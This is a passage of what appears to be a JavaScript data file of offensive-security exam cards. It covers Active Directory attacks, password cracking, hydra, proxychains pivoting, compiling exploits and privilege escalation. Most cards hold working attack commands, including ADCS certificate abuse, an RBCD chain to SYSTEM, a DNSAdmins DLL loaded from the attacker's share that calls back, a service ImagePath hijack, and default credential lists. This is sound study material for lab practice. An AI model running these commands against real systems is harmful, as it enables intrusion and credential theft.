    alive: `gpp-decrypt prints a clear password
nxc prints [+] for that user`,
    dead: "No xml, or xml with no cpassword. SYSVOL is not empty of scripts: still skim for a hard-coded password, then leave.",
    next: "The decrypted password is sprayed once, against users you have, not against rockyou.",
  },
  {
    id: "ad-shares",
    section: "Active Directory",
    title: "Domain shares",
    look: "Scripts, xml, ps1, config, and IT notes. Not a place to download every ISO.",
    cmd: `nxc smb <cidr> -u <user> -p '<pass>' --shares
nxc smb <ip> -u <user> -p '<pass>' --spider 'Scripts' --pattern 'pass|kdbx|xml|config'`,
    alive: "READ on a non-default share and a file that contains a password or a username.",
    dead: "SYSVOL and NETLOGON only, and you already did the GPP check. IPC$ is not a file share.",
    next: "The new cred goes into nxc before you spider a second host.",
  },
  {
    id: "ad-ptt",
    section: "Active Directory",
    title: "Pass the ticket",
    look: "You have a ccache or a kirbi, from a roast you already cracked or from a session on a host. The ticket is the credential. You do not need to crack it if it is already yours.",
    cmd: `export KRB5CCNAME=/home/kali/user.ccache
nxc smb <dc> -u <user> --use-kcache
impacket-psexec <domain>/<user>@<dc> -k -no-pass`,
    alive: "(Pwn3d!) or a shell without you typing a password.",
    dead: "Clock skew too great, or KDC_ERR_PREAUTH. Fix the clock with ntpdate or date -u against the DC, then try once more. A ticket for a user with no admin rights will not psexec. That is not a broken ticket.",
    next: "If it is a service ticket for one SPN, use it on that host only.",
  },
  {
    id: "ad-adcs",
    section: "Active Directory",
    title: "ADCS, only if it is there",
    look: "Open this only after a domain username and password are already yours, and roast, ACL, and shares did not give you a path. You are checking whether a certificate authority exists. You are not working through ESC2 and the rest.",
    cmd: `certipy find -u <user>@<domain> -p '<pass>' -dc-ip <dc> -vulnerable -stdout
# ESC1 only. CA name and template name come from that output.
certipy req -u <user>@<domain> -p '<pass>' -dc-ip <dc> -ca '<CA>' -template '<Template>' -upn administrator@<domain>
certipy auth -pfx administrator.pfx -dc-ip <dc>`,
    alive: `ESC1 and Enrollee Supplies Subject
certipy auth prints an NT hash
nxc smb <dc> -u administrator -H <hash> prints (Pwn3d!)`,
    dead: "No CA, or find prints no vulnerable template. Stop. Do not open the next ESC number because this one was empty.",
    next: "One template, the one find marked. auth prints an NT hash. Pass it with nxc. Do not request a second template.",
  },
  {
    id: "ad-zerologon",
    section: "Active Directory",
    title: "ZeroLogon is a last look",
    look: "An unpatched DC and every identity path above is dead. CVE-2020-1472 is not the opener. A patched 2022 DC will not fall over because you hoped.",
    cmd: `# only after roast, ACL, LAPS, shares, and local privesc are dead
nxc smb <dc> -u '' -p '' -M zerologon`,
    alive: "The module says the DC is vulnerable. Then one exploit you have already practised, knowing it can break the DC if you do it wrong.",
    dead: "Not vulnerable. Stop. Go back to a standalone or a host you under-enumerated.",
    next: "If you take the DC this way, dump hashes, set the password back if the tool requires it, and screenshot proof before you do anything else.",
  },
  {
    id: "pw-sshkey",
    section: "Passwords",
    title: "You cannot see a key passphrase",
    look: "An OpenSSH private key. BEGIN OPENSSH PRIVATE KEY looks the same with a passphrase and without one. The file will not say 'encrypted' in a way you should trust by eye.",
    cmd: `file id_key
ssh -i id_key user@<ip>
# if it asks for a passphrase
ssh2john id_key > key.hash
john --wordlist=/usr/share/wordlists/rockyou.txt key.hash
john --show key.hash`,
    alive: `Enter passphrase for key
# then john prints
id_key:thepassword`,
    dead: "ssh connects with no prompt. The key has an empty passphrase. Do not run john. Or john says No password hashes loaded: you pointed it at the raw key instead of ssh2john output.",
    next: "ssh -i id_key. The passphrase is for the key, not a sudo password, until you try it as one.",
  },
  {
    id: "pw-linuxhash",
    section: "Passwords",
    title: "Linux hashes",
    look: "The prefix picks the tool. $6$ is sha512crypt. $y$ is yescrypt and john is the easier cracker. You need both passwd and shadow for unshadow.",
    cmd: `unshadow passwd shadow > u.txt
john --wordlist=/usr/share/wordlists/rockyou.txt u.txt
john --show u.txt`,
    alive: "user:password in --show.",
    dead: "No password hashes loaded: you only copied /etc/passwd, which has an x in the hash field. Or exhausted: not in rockyou.",
    next: "su user, then sudo -l as that user. Their password is often reused for root on a lab box. Try it once.",
  },
  {
    id: "pw-rule",
    section: "Passwords",
    title: "One rule, then stop",
    look: "Rockyou missed, and the password looks like a season plus a year or the company name. One rules pass. Not a four-hour mask.",
    cmd: `hashcat -m 1000 ntlm.txt -w 3 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
hashcat -m 1000 ntlm.txt --show`,
    alive: "Cracked after the rule, and the password is something a human set.",
    dead: "Exhausted again. The secret is random. Pass the hash if it is NTLM. If it is a TGS, the roast is a dead end.",
    next: "Back to enumeration. Cracking is not the exam.",
  },
  {
    id: "pw-hydra",
    section: "Passwords",
    title: "Hydra only with a tiny list",
    look: "You have two or three passwords and a login form or SSH, and spray is the wrong tool. Hydra against rockyou on the exam is how you lock an account or waste an hour.",
    cmd: `hydra -L users.txt -P found.txt ssh://<ip>
hydra -l admin -P found.txt <ip> http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'`,
    alive: "[22][ssh] host: login: password succeeds, and you found the password on the box, not in rockyou.",
    dead: "A screen of failures. Stop after the small list. Fix the http-post-form failure string before you believe a false positive.",
    next: "Or open Builders and pick hydra. If the failure text is a guess, build the form from the browser. Do not switch found.txt for rockyou.",
  },
  {
    id: "pw-hydra-form",
    section: "Passwords",
    title: "Hydra — build the form",
    look: "The password list is the small file you already have. The part that goes wrong is the form string. One failed login in the browser tells you the path, the body, and the failure text. A huge __VIEWSTATE in the body means stop. That value expires and hydra will lie.",
    cmd: `# browser: bad login, Network tab, the POST
# path, then body with ^USER^ and ^PASS^, then text that appears only on failure
hydra -l admin -P found.txt -t 1 -f <ip> http-post-form "/login.php:username=^USER^&password=^PASS^:Invalid Password!"
# port 443
hydra -l admin -P found.txt -t 1 -f <ip> https-post-form "/db/index.php:password=^PASS^&login=Log+In:Incorrect password"
# success text instead, when the failure text is useless. S= is the success marker.
hydra -l admin -P found.txt -t 1 -f <ip> http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:S=Location"
# other services. -u tries every user with one password before the next password.
hydra -t 1 -f -u -L users.txt -P found.txt ssh://<ip>
hydra -t 1 -f -l <user> -P found.txt ftp://<ip>
hydra -t 1 -f -l administrator -P found.txt rdp://<ip>
hydra -t 1 -f -l <user> -P found.txt smb://<ip>`,
    alive: "Hydra prints the host, the login, and the password, and you can log in once with that pair in the browser.",
    dead: "Every line is a failure, or every line is a success. The second one means the failure string is wrong. Fix the string. Do not point -P at rockyou, and do not hydra SMB or RDP at a domain.",
    next: "One login. Confirm it. The same password goes to SSH, SMB, or WinRM by hand. Hydra is finished.",
  },
  {
    id: "pv-proxy",
    section: "Tunneling",
    title: "proxychains4.conf",
    look: "SOCKS from ssh -D or from Chisel R:socks. Ligolo does not read this file. The file is wrong, on a default Kali, because it skips 10/8, 172.16/12, and 192.168/16. Those are the exam networks. Traffic then goes direct and the tunnel looks dead.",
    cmd: `# what Kali is doing right now
grep -n -E 'localnet|strict_chain|dynamic_chain|proxy_dns|^socks' /etc/proxychains4.conf
# write the exam file. One proxy. DNS through it. Private ranges are NOT excluded.
sudo tee /etc/proxychains4.conf >/dev/null << 'EOF'
# one of these. not both.
# strict_chain  fails if this one proxy is down. use this.
# dynamic_chain skips a dead proxy. only useful if you listed more than one.
strict_chain
# random_chain is not an exam option.
proxy_dns
quiet_mode
tcp_read_time_out 15000
tcp_connect_time_out 8000
# localnet is the list of addresses that BYPASS the proxy.
# 127 is correct. 10, 172.16, and 192.168 must stay commented.
localnet 127.0.0.0/255.0.0.0
# localnet 10.0.0.0/255.0.0.0
# localnet 172.16.0.0/255.240.0.0
# localnet 192.168.0.0/255.255.0.0
[ProxyList]
# type  address      port
# must match the port you actually opened
socks5 127.0.0.1 1080
# socks4 127.0.0.1 1080
# http   127.0.0.1 8080
EOF`,
    alive: "The three private localnet lines start with #. The one socks5 line matches the port from ss -tlnp, usually 1080.",
    dead: "localnet 10.0.0.0 is uncommented, or socks5 says 9050 while Chisel opened 1080. Or two proxy lines are both uncommented, so it tries to chain them.",
    next: "The next card is which tools obey the file, and the nmap flags that do not lie.",
  },
  {
    id: "pv-px-use",
    section: "Tunneling",
    title: "What you run through it",
    look: "proxychains only hooks programs that connect with normal libc. A raw SYN scan never enters the file. A Go binary often ignores it too. If the tool does not use the proxy, use Ligolo or an ssh -L of that one port.",
    cmd: `# confirm the SOCKS port is open before you blame the tool
ss -tlnp | grep 1080
# these obey the file
proxychains4 -q curl -sI http://172.16.0.10/
proxychains4 -q nmap -Pn -sT -n -p 22,80,445,3389,5985 172.16.0.10
proxychains4 -q smbclient -N -L //172.16.0.10/
proxychains4 -q nxc smb 172.16.0.10 -u <user> -p '<pass>'
# a browser, set in the browser, not wrapped
# manual proxy, SOCKS5, 127.0.0.1, 1080, and proxy DNS
# these do not obey it
# nmap -sS     raw sockets, every port looks open or filtered
# masscan
# a Go tool whose file says statically linked and is not using libc
# -f uses a copy, when you do not want to edit the system file
proxychains4 -f ~/exam/pc.conf -q curl -sI http://172.16.0.10/`,
    alive: "curl -sI through it returns headers from a host Kali cannot reach directly. nmap -sT lists a few real ports, not all 65535 open.",
    dead: "The same ports as a direct nmap, or every port open. The first means the localnet lines bypassed the proxy. The second means you used -sS.",
    next: "Service cards, through the same prefix. One host at a time. A /24 is Ligolo.",
  },
  {
    id: "pv-files",
    section: "Tunneling",
    title: "Files across the pivot",
    look: "The internal host cannot see your Kali IP. Serve the file from the machine that can reach both, or push it through the tunnel you already have.",
    cmd: `# on the pivot host, which can see Kali and the internal box
python3 -m http.server 8080
# internal target downloads from the pivot, not from Kali
curl -o tool http://<PIVOT>:8080/tool
# or a local forward so the internal site is on your Kali
ssh -L 8080:<internal>:80 user@<pivot>`,
    alive: "The size matches. Or your browser on 127.0.0.1:8080 shows the internal app.",
    dead: "Connection timed out to your VPN address from the internal host. That host will never reach Kali until a tunnel exists the other way.",
    next: "Ligolo if you are going to scan the whole subnet. A single -L if it is one web port.",
  },
  {
    id: "cc-errors",
    section: "Compile",
    title: "What the compiler is saying",
    look: "Three errors that are not 'the exploit does not work'.",
    cmd: `# 1 invalid preprocessing directive #Exploit
#    Exploit-DB header. Delete those lines or make them // comments.
# 2 missing terminating " character
#    a string was split across two lines. Put it back on one line.
# 3 version GLIBC_2.34 not found
#    you compiled dynamic on a new Kali for an older box.
file ./exploit
gcc -static exploit.c -o exploit
file ./exploit`,
    alive: "file says statically linked, and the target runs it.",
    dead: "You are editing a 441-byte HTML download, or you keep rebuilding dynamically and re-uploading the same glibc error.",
    next: "One static build. Run it once. If the target says the exploit failed, the version was wrong. Stop and re-check sudo --version or the banner. Do not tune the PoC.",
  },
  {
    id: "cc-which",
    section: "Compile",
    title: "Which compiler",
    look: "Linux target: gcc, static if you are not on that box. Windows target: mingw, and the arch from systeminfo. A .c.txt from the browser is not the source.",
    cmd: `file source.c
head -n 5 source.c
gcc -static source.c -o exploit
# windows
x86_64-w64-mingw32-gcc source.c -o exploit.exe
file exploit exploit.exe`,
    alive: "source starts with #include and file on the output says ELF static or PE32+.",
    dead: "source starts with <!DOCTYPE or # Exploit Title. You saved the webpage or left the EDB banner.",
    next: "Fix the source, rebuild, compare size, then transfer.",
  },
  {
    id: "rep-live",
    section: "Report",
    title: "Write while the shell is open",
    look: "The report is how the points get paid. A flag with no screenshot of whoami or id, the IP, and the flag in one frame does not survive review. Copy the text into the report form before you keep enumerating.",
    cmd: `# Linux. hostname -I keeps the flag on screen. ip a is too tall.
whoami; id; hostname; hostname -I; cat local.txt
whoami; id; hostname; hostname -I; cat proof.txt
# Windows
whoami & hostname & ipconfig & type C:\\Users\\Public\\local.txt
whoami & hostname & ipconfig & type C:\\Users\\Administrator\\Desktop\\proof.txt`,
    alive: "The screenshot shows the flag and the identity in the same frame, and the text is also in your notes.",
    dead: "You closed the shell and the flag was only on the screen. You do not remember which host.",
    next: "Paste the foothold, the privilege escalation, and both flags into the report form on this page before you leave the host.",
  },
  {
    id: "rep-map",
    section: "Report",
    title: "What each box owes the report",
    look: "Standalone: how you got the low user, how you became root or SYSTEM. AD: how you moved, and how you became domain admin. Not a diary of every dead port.",
    cmd: `# per host
# 1. foothold command and the evidence
# 2. privesc command and the evidence
# 3. flags
# dead ends: one line each, so you can defend them`,
    alive: "Someone else could repeat the two steps from your notes without your terminal.",
    dead: "A list of nmap ports and no mention of the password that actually worked.",
    next: "Type those three things into the report form on this page. The PDF is the path that worked, not the dead ports.",
  },
  {
    id: "rep-flags",
    section: "Report",
    title: "Where the flags are",
    look: "local.txt is the low user. proof.txt is root, SYSTEM, or the domain admin desktop. Names vary only if the lab said so. Do not stop at local and call the box done.",
    cmd: `# Linux
find / -name local.txt -o -name proof.txt 2>/dev/null
# Windows
dir /s /b C:\\Users\\*\\Desktop\\proof.txt C:\\Users\\*\\Desktop\\local.txt 2>nul`,
    alive: "A 32-character proof in the admin desktop or /root, and you are that user in the screenshot.",
    dead: "You found local.txt as www-data and started the report. The box is worth half. Go to privesc.",
    next: "If find returns nothing, you are not the right user yet. whoami again.",
  },
  {
    id: "lin-so",
    section: "Linux",
    title: "SUID shared object",
    look: "A custom SUID binary, and LD_PRELOAD is dead because you are not going through sudo. strace shows the program trying to open a library that does not exist, in a directory you can write. You plant that missing file. You are not editing a library that already loads.",
    cmd: `strace -f /opt/custom 2>&1 | grep -iE 'openat|open\\(|no such file'
# a line like: openat(AT_FDCWD, "/opt/custom/libmissing.so", ...) = -1 ENOENT
ls -la /opt/custom
gcc -shared -fPIC -o /opt/custom/libmissing.so p.c
/opt/custom`,
    alive: "strace prints ENOENT or 'no such file' for a .so whose directory you can write. After you plant it, the SUID binary runs your constructor as root.",
    dead: "Every open succeeds, or the missing file sits in a directory you cannot write. Also dead if this is only env_keep on sudo. That is the LD card, and the linker ignores LD_* on a SUID file you start yourself.",
    next: "The C file is the same small constructor you use for LD_PRELOAD. If the binary gets past the missing file and crashes on a symbol, the plant loaded. Fix the symbol or keep the constructor tiny. One binary. Do not strace passwd.",
  },
  {
    id: "win-runonce",
    section: "Windows",
    title: "RunOnce and 32-bit Run",
    look: "Same idea as the Run key, but two places the other card does not query. RunOnce fires once at logon. WOW6432Node is the 32-bit view of the registry on a 64-bit host. HKCU still only runs as you.",
    cmd: `reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce
reg query HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce
reg query HKLM\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Run
reg query HKCU\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Run
icacls "C:\\Program Files\\Vendor\\tool.exe"`,
    alive: "A value points at an exe you can replace, and the key is HKLM so the next privileged logon runs it.",
    dead: "The system was unable to find the key, or icacls is (RX). HKCU RunOnce as yourself is not privilege escalation. Do not wait on a logon that is not coming.",
    next: "Replace the exe, note that it needs a logon, and keep enumerating. If nothing else is alive and nobody will log on, this is parked, not a shell.",
  },
  {
    id: "win-regkey",
    section: "Windows",
    title: "Writable service registry key",
    look: "You cannot sc config the service, and AlwaysInstallElevated is not set, but you can write the service's own registry key. ImagePath is the command Windows runs when that service starts. This is a different object from the service DACL.",
    cmd: `reg query "HKLM\\SYSTEM\\CurrentControlSet\\Services\\<svc>" /v ImagePath
accesschk.exe /accepteula -kvuqsw <user> HKLM\\SYSTEM\\CurrentControlSet\\Services\\<svc>
sc qc <svc>
reg add "HKLM\\SYSTEM\\CurrentControlSet\\Services\\<svc>" /v ImagePath /t REG_EXPAND_SZ /d "C:\\Users\\Public\\shell.exe" /f
sc stop <svc> & sc start <svc>
whoami`,
    alive: "accesschk shows KEY_WRITE or KEY_ALL_ACCESS, SERVICE_START_NAME is LocalSystem, and whoami prints nt authority\\system.",
    dead: "accesschk prints nothing you can write. sc config failing does not decide this card, and this card failing does not decide AlwaysInstallElevated. They are three different checks.",
    next: "If you cannot start the service, park it. Do not set ImagePath on a service you do not own and then reboot a DC.",
  },
  {
    id: "svc-odd",
    section: "Services",
    title: "Odd ports",
    look: "A port that is not in the decision list. Most of the old port pages were a title and no steps. The method is the banner, one default password, then searchsploit on the product name. Then leave.",
    cmd: `nc -nv <ip> <port>
nmap -Pn -sV -p <port> <ip>
# 1521 Oracle     one try: system / manager
# 512 rexec       513 rlogin     a user you already have, then stop
# 6000 X11        no auth is rare. Banner, then leave.
# 1080 SOCKS      1194 OpenVPN   1434 SQL browser
# 3128 Squid      5060 SIP       5938 TeamViewer
# 6667 IRC        1723 PPTP      179 BGP
searchsploit <product> <version>`,
    alive: "The banner names a product and a default from the Defaults card logs in, or searchsploit matches that exact product and you can reach the precondition.",
    dead: "A banner and no login, or searchsploit hits that need a module you cannot reach. The port is done. Do not write a client for SIP.",
    next: "Oracle without sqlplus is still just a version string. rlogin and rexec only matter when you already have a password. X11 with no display is not a shell.",
  },
  {
    id: "pw-defaults",
    section: "Passwords",
    title: "Defaults, not a wordlist",
    look: "One or two product defaults, typed by hand, after you know the product. This is not rockyou and not hydra. SprayGen is how you build a tiny company list (name, season, year) when you already know the org. One pattern, then stop.",
    cmd: `# anonymous FTP: anonymous / empty
# Tomcat: tomcat / tomcat    admin / admin
# Jenkins: admin / admin, or no login at all
# MySQL: root / empty
# Postgres: postgres / postgres
# Oracle: system / manager
# SNMP: public then private
# Grafana: admin / admin
# JBoss: admin / admin
# RabbitMQ: guest / guest
# SSH and telnet: root / empty, admin / admin, once
# a lab company list, not a spray of these at a DC
# spraygen or just type: Company2024!  Summer2024!  <name>2024`,
    alive: "The product's own default opens the login. Or one company-season password hits a user you already enumerated.",
    dead: "Those pairs failed. Do not paste this list into hydra. SprayGen against every domain user is still a spray.",
    next: "The password you found is reused. SMB, WinRM, SSH, and the web app. Then stop guessing.",
  },
  {
    id: "ad-dnsadmins",
    section: "Active Directory",
    title: "DNSAdmins",
    look: "whoami /groups lists DNSAdmins. Members can point the DNS service at a DLL and restart it. The DLL runs as SYSTEM. You are not in this group just because the host is a DC.",
    cmd: `whoami /groups | findstr /i DNSAdmins
# a DLL you have already built that calls back. Put it on a share the DC can read.
dnscmd <dc> /config /serverlevelplugindll \\\\<KALI>\\share\\shell.dll
sc \\\\<dc> stop dns
sc \\\\<dc> start dns`,
    alive: "DNSAdmins is in the group list, the restart works, and the callback is SYSTEM.",
    dead: "findstr prints nothing. Do not build the DLL. If you are in the group but cannot restart DNS, the card is parked.",
    next: "After the shell, clear the plugin setting so DNS is not left pointing at your file. This is a lab DC. Screenshot proof first.",
  },
  {
    id: "ad-powerview",
    section: "Active Directory",
    title: "PowerView, when you are already on a host",
    look: "You have a domain shell and you do not want to go back to Kali. PowerView answers users, groups, computers, ACLs, and Kerberoast. If the script is not already there, use the nxc and BloodHound cards instead of spending the hour fetching it.",
    cmd: `powershell -ep bypass -c "Import-Module .\\PowerView.ps1; Get-DomainUser | Select-Object samaccountname,description"
Get-DomainGroupMember -Identity "Domain Admins" -Recurse
Get-DomainComputer | Select-Object dnshostname,operatingsystem
Get-DomainObjectAcl -Identity <you> -ResolveGUIDs
Invoke-Kerberoast
Get-NetLocalGroup -ComputerName <host> | Select-Object GroupName,MemberName`,
    alive: "A description with a password, a user in Domain Admins you can reach, an ACL you recognise, or a Kerberoast hash.",
    dead: "Import-Module fails and you do not already have the ps1. Stop. nxc from Kali lists the same users. The long gist is a reference, not a second methodology.",
    next: "One fact, then the matching AD card. Do not run every Get-Domain* because the cheat sheet has them.",
  },
  {
    id: "ad-shadowcred",
    section: "Active Directory",
    title: "Shadow credentials",
    look: "BloodHound says you can write the target (GenericWrite or GenericAll), and the useful attribute is msDS-KeyCredentialLink. You add a key you control, then you authenticate as that account and get its NT hash. This needs a 2016 or newer DC. Editing the description and stopping is the wrong use of GenericWrite.",
    cmd: `# Kali, the tool you already use for certificates
certipy shadow auto -u <user>@<domain> -p '<pass>' -account <target>
# on a domain host, if Whisker is what you practised
Whisker.exe add /target:<target> /domain:<domain>`,
    alive: "The tool adds the credential and prints an NT hash or a certificate you can ask a TGT with. nxc then shows [+] as that account.",
    dead: "Insufficient access, or the domain is older than 2016. You mis-read the edge. Do not keep running it against random users.",
    next: "The new hash is pass-the-hash or a TGT, to the host that account admins. Remove the key when the lab is done if the tool has a clear command. Do not leave it as your only note.",
  },
  {
    id: "ad-gmsa",
    section: "Active Directory",
    title: "gMSA passwords you can read",
    look: "A group Managed Service Account. The password is in LDAP, and your user is allowed to read it. The account name ends in $. The hash is a machine-style NT hash. Pass it. Do not crack it.",
    cmd: `nxc ldap <dc> -u <user> -p '<pass>' -M gmsa
# a hit prints the account and the NT hash
nxc smb <targets> -u '<gmsa>$' -H <nthash>`,
    alive: "The module prints an NT hash for an account ending in $, and nxc shows [+] or (Pwn3d!) on a host that account is local admin of.",
    dead: "No gMSA, or you are not in the principals allowed to retrieve the password. Do not try every computer account.",
    next: "That hash is pass-the-hash onto the one host. Landing checks. It is not domain admin until that host says so.",
  },
  {
    id: "ad-rbcd",
    section: "Active Directory",
    title: "Write access on a computer",
    look: "BloodHound says GenericAll or GenericWrite on a computer, and you are not already admin there. You add a machine account you control and point that computer at it. This does not coerce anyone and it does not relay. If the edge is not on a computer, this card is dead.",
    cmd: `nxc ldap <dc> -u <user> -p '<pass>' -M maq
# quota above 0, or you already own a computer account
impacket-addcomputer <domain>/<user>:'<pass>' -computer-name HELP -computer-pass 'HelpPass!23' -dc-ip <dc>
impacket-rbcd <domain>/<user>:'<pass>' -delegate-from 'HELP$' -delegate-to '<TARGET>$' -action write -dc-ip <dc>
impacket-getST <domain>/'HELP$':'HelpPass!23' -spn cifs/<target.fqdn> -impersonate Administrator -dc-ip <dc>
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass <domain>/Administrator@<target.fqdn>`,
    alive: "maq is not 0, rbcd says the delegation was written, and psexec is SYSTEM on that one computer.",
    dead: "Machine account quota is 0 and you do not already own a computer. Or the edge was on a user, not a computer. Or clock skew: sync the clock once and retry the ticket once.",
    next: "That host gets the Windows landing checks. Clear the delegation when you are done if you still have the write right. One computer.",
  },
  {
    id: "ad-persist",
    section: "Active Directory",
    title: "Persistence is not the score",
    look: "Golden, silver, diamond, DSRM, skeleton key, and DCShadow. Every one of them assumes you already have a secret (krbtgt, a machine hash) or you are already domain admin. None of them is how you get the first flag. Read proof.txt first.",
    cmd: `# Silver, only when you already have a machine NT hash and the domain SID
impacket-ticketer -nthash <hash> -domain-sid <sid> -domain <domain> -spn cifs/<host> <user>
export KRB5CCNAME=<user>.ccache
impacket-psexec <domain>/<user>@<host> -k -no-pass
# Golden: same idea with the krbtgt hash and no SPN. A forged TGT. Persistence.
# Diamond: a golden ticket built from a real TGT. Easier to get wrong. Skip.
# DSRM: local Administrator of a DC you already own. Setting DsrmAdminLogonBehavior to 2 is optional and noisy.
# Skeleton: mimikatz misc::skeleton on a DC. A reboot removes it. You were already DA.
# DCShadow: two mimikatz sessions to push one attribute. Needs DA. A typo is loud. Not a foothold.`,
    alive: "You lost the session and you still have the hash, so one forged ticket gets the shell back. Proof was already screenshotted.",
    dead: "You are not domain admin and you do not have krbtgt or a computer hash. These cards are dead. Go back to BloodHound, roast, and LAPS.",
    next: "If silver is the reason you can reach one host, that host gets the Windows landing checks. Do not forge a golden ticket to 'finish' a set you can already read the flag on.",
  },
];
